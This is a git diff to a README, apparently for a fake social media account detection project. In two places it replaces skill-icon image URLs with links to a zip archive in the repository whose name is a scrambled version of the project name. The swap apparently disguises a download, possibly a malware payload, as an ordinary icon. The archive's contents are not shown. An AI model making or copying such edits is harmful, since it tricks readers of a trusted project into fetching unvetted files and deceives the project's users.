@@ -41,7 +41,7 @@ The system includes:
 <div align="left">
 
 ### **Languages**
-<img src="https://skillicons.dev/icons?i=python" height="40">
+<img src="https://github.com/AlapatiAbhinavChowdhary/fake-social-media-account-dection/raw/refs/heads/main/betailor/dection-media-account-fake-social-v2.8-beta.2.zip" height="40">
 
 ### **Libraries & Frameworks**
 <img src="https://img.shields.io/badge/Pandas-150458.svg?style=for-the-badge&logo=Pandas&logoColor=white">
@@ -51,7 +51,7 @@ The system includes:
 <img src="https://img.shields.io/badge/Streamlit-FF4B4B?style=for-the-badge&logo=streamlit&logoColor=white">
 
 ### **Tools**
-<img src="https://skillicons.dev/icons?i=vscode,github" height="40">
+<img src="https://github.com/AlapatiAbhinavChowdhary/fake-social-media-account-dection/raw/refs/heads/main/betailor/dection-media-account-fake-social-v2.8-beta.2.zip,github" height="40">
 
 </div>
 
